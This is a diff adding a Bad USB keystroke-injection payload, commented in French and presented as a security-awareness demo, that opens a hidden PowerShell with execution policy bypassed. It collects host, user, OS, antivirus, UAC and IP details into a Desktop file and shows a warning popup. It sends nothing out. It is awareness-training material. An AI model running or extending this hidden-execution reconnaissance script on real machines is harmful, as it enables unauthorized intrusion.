@@ -1,0 +1,29 @@
+REM =====================================================================
+REM  Payload Bad USB — DÉMONSTRATION SENSIBILISATION SÉCURITÉ
+REM  Auteur  : Kapelgy
+REM  Usage   : Formation cybersécurité — Simulation d'attaque USB
+REM  Cible   : Windows 10/11
+REM
+REM  CE PAYLOAD EST STRICTEMENT ÉDUCATIF.
+REM  Il affiche uniquement une popup de sensibilisation et collecte
+REM  des informations système non sensibles dans un fichier local.
+REM  Il ne transmet aucune donnée à l'extérieur.
+REM  À utiliser UNIQUEMENT sur des systèmes pour lesquels vous avez
+REM  une autorisation écrite explicite.
+REM =====================================================================
+
+REM Délai initial pour laisser le système reconnaître le périphérique HID
+DELAY 1500
+
+REM ─── Ouverture PowerShell en mode silencieux
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command
+DELAY 100
+
+REM ─── Commande principale inline (tout en une ligne)
+STRING "$h=[System.Net.Dns]::GetHostName();$u=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name;$os=(Get-WmiObject Win32_OperatingSystem).Caption;$av=(Get-WmiObject -Namespace 'root\SecurityCenter2' -Class AntiVirusProduct -EA SilentlyContinue | Select-Object -First 1 displayName).displayName;$uac=(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -EA SilentlyContinue).ConsentPromptBehaviorAdmin;$ip=(Get-NetIPAddress -AddressFamily IPv4 -EA SilentlyContinue | Where-Object {$_.IPAddress -notlike '127*'} | Select-Object -First 1).IPAddress;$usb='NoRestriction';$log='TARGET_HOST='+$h+[char]10+'TARGET_USER='+$u+[char]10+'TARGET_OS='+$os+[char]10+'EXECUTION_STATUS=SUCCESS'+[char]10+'AV_STATUS='+$av+[char]10+'UAC_LEVEL=ConsentPromptBehaviorAdmin='+$uac+[char]10+'USB_POLICY='+$usb+[char]10+'IP_ADDRESSES='+$ip+[char]10+'TIMESTAMP='+(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')+[char]10+'NOTES=Demo payload - Kapelgy';$logPath=$env:USERPROFILE+'\Desktop\AUDIT_USB_DEMO.txt';$log | Out-File -FilePath $logPath -Encoding UTF8;Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('DEMO SECURITE - KAPELGY'+[char]10+[char]10+'Ce message a ete genere par un peripherique USB branche sur votre poste.'+[char]10+[char]10+'Un attaquant aurait pu :'+[char]10+' - Installer un logiciel malveillant'+[char]10+' - Extraire vos identifiants'+[char]10+' - Prendre le controle de votre machine'+[char]10+[char]10+'Rapport enregistre sur votre Bureau.'+[char]10+'Contactez votre DSI pour plus d informations.','AUDIT DE SECURITE PHYSIQUE - DEMO',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)"
+ENTER
+
+REM ─── Fin du payload
+DELAY 500
